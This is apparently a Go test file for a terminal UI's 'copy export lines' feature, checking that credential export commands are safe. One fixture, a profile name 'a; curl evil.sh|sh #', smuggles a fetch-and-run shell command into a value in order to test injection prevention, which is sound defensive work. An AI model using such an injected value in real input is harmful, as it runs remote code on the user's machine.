package tui

import (
	"context"
	"strings"
	"testing"

	"github.com/this-is-tobi/rule-them-all/internal/config"
	"github.com/this-is-tobi/rule-them-all/pkg/plugin"
	"github.com/this-is-tobi/rule-them-all/pkg/view"
)

// `y` on the profiles pane, which writes shell for somebody to paste — the one
// key in this app whose output is a command.

// credentialPlugin declares a Secret a profile can fill, which is what makes a
// profile have an export line at all. The registry the other profile fixtures
// build has no Secret anywhere in it, so every one of them says "no credential
// needed" and none of them reaches this key.
func credentialPlugin() plugin.Plugin {
	run := func(context.Context, plugin.Request) (view.View, error) { return view.Text{}, nil }
	return plugin.Plugin{Name: "vaulty", Summary: "a plugin with a credential",
		Capabilities: []plugin.Capability{{
			ID: "vaulty.get", Summary: "get", Safety: plugin.Read, Run: run,
			Inputs: []plugin.Field{
				{Name: "token", Type: plugin.Secret, Local: true, EnvFallback: true, Help: "the token"},
			},
		}}}
}

func profileNeedingACredential(t *testing.T, name string) Model {
	t.Helper()
	m := profileModel(t, config.Config{Profiles: map[string]config.Profile{
		name: {Plugins: map[string]config.Connection{"vaulty": {}}},
	}})
	if err := m.reg.Register(credentialPlugin()); err != nil {
		t.Fatal(err)
	}
	m.plugins = pluginRows(m.reg, config.Dashboard{}, nil)
	m.profiles = m.profileRows()
	m.mode, m.profileSel = modeProfiles, 0
	return m
}

// **An environment rta has already called invalid does not get to write a
// command.**
//
// The variable name is derived from the profile's name. A name that never
// passed ValidName can hold anything a config file holds, and this pane
// printed "not a valid profile name" in red on the band and then, on the very
// next keypress, put a line built out of that name on the clipboard under
// "fill in the value and run it".
//
// Two independent fixes, because the one that was being relied on lived in
// another package: envToken makes the name an identifier whatever it is given
// (pkg/plugin), and this refuses before it gets there.
func TestAnInvalidProfileNeverWritesAnExportLine(t *testing.T) {
	const bad = "a; curl evil.sh|sh #"
	if config.ValidName(bad) {
		t.Fatal("the fixture's name is legal, so it proves nothing")
	}
	m := profileNeedingACredential(t, bad)
	if m.profiles[0].valid() {
		t.Fatal("the loader accepted the name — this test is about the one it rejects")
	}

	got := m.copyExportLine()
	if strings.Contains(got, "export ") {
		t.Errorf("the copy produced %q — a line built out of a name rta had already refused", got)
	}
	// The refusal does name the profile, which the band beside it already
	// does: the operator has to know which of their environments this is
	// about, and this is their own config file rather than something that
	// arrived from elsewhere. What must not happen is the name becoming a
	// command.
	if !strings.Contains(got, "not a valid profile name") {
		t.Errorf("the refusal does not say why: %q", got)
	}
}

// The key and the hint answer to one predicate, so a footer cannot advertise
// what a keypress will not do or hide what it will.
func TestTheExportHintAppearsExactlyWhenThereIsSomethingToCopy(t *testing.T) {
	with := profileNeedingACredential(t, "staging")
	if !advertises(with, "y") {
		t.Error("an environment with an unset credential does not offer the key that copies its export line")
	}
	if !strings.Contains(plainFooter(with), "copy export lines") {
		t.Errorf("the label is not a verb: %s", plainFooter(with))
	}

	// The same pane on an environment that needs no credential at all.
	without := profileModel(t, twoProfileConfig())
	without.mode, without.profileSel = modeProfiles, 0
	if advertises(without, "y") {
		t.Error("an environment with nothing to copy still advertises the copy")
	}
	before := fingerprint(without)
	after, cmd := without.Update(keyMsg("y"))
	if fingerprint(after.(Model)) != before || cmd != nil {
		t.Error("`y` answered on a pane that does not advertise it — the two must not disagree")
	}
}

// And on the environment that does have one, the line is a shell command:
// one variable per line, with the value left as a placeholder because a
// credential belongs on a screen no more than in a config file.
func TestTheExportLineIsAShellCommandWithNoValueInIt(t *testing.T) {
	// Without this the test asserts on whatever clipboard the machine
	// running it happens to have. A headless runner has none, and
	// clipboard.Copy then reports honestly that it could not copy — so the
	// assertion below fails for a property of the box rather than of the
	// code. Seven tests in this package already stand a fake in; these did
	// not, and passed only where pbcopy exists.
	fakeClipboard(t)
	m := profileNeedingACredential(t, "staging")
	env := plugin.ProfileEnvVar("staging", "token")

	got := m.copyExportLine()
	if !strings.Contains(got, "1 export line") {
		t.Fatalf("copy said %q", got)
	}
	line := "export " + env + "=…"
	for _, r := range env {
		if !((r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '_') {
			t.Fatalf("%q is not something a shell will accept after `export`", env)
		}
	}
	if strings.Contains(line, ";") || strings.Contains(line, "$") || strings.Contains(line, "|") {
		t.Errorf("the line carries shell syntax: %q", line)
	}
}

func advertises(m Model, key string) bool {
	for _, it := range m.footerItems(m.mode) {
		for _, k := range it.keys {
			if k == key {
				return true
			}
		}
	}
	return false
}

func plainFooter(m Model) string {
	return plain(fitHintBar(0, footerMaxLines, m.footerItems(m.mode)...))
}
